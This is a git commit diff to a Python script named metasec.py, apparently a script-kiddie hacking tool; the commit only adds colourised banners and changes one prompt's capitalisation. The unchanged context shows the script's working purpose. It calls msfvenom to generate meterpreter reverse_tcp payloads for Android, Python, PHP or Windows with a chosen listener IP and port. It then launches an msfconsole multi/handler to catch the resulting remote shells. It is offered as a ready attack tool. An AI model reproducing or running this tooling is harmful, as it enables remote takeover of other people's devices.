bc44fbcab27f8d8eff9e6286da1ee70f8eab2494
MALWARE <57804710+MALW4R3@users.noreply.github.com>
2020-05-06 21:29:48 +0700

    Update metasec.py

--- metasec.py
+++ metasec.py
@@ -19,7 +19,7 @@ bytes = random._urandom(1490)
 os.system ("figlet -f slant METASEC | lolcat -a")
 time.sleep(3)
 os.system ("clear")
-os.system ("figlet PAYLOAD")
+os.system ("figlet PAYLOAD | lolcat")
 print
 print " BY : DEFALT "
 print
@@ -29,13 +29,13 @@ port = raw_input ("PORT : ")
 out = raw_input ("OUTPUT : ")
 os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (la, ip, port, out))
 os.system ("clear")
-os.system ("figlet EXPLOIT")
+os.system ("figlet EXPLOIT | lolcat")
 print
 print " PROGRAM BY DEFALT "
 print
 la = raw_input ("android/python/php/windows : ")
 ip = raw_input ("IP : ")
-port = raw_input ("Port : ")
+port = raw_input ("PORT : ")
 os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (la, ip, port,))
 
 
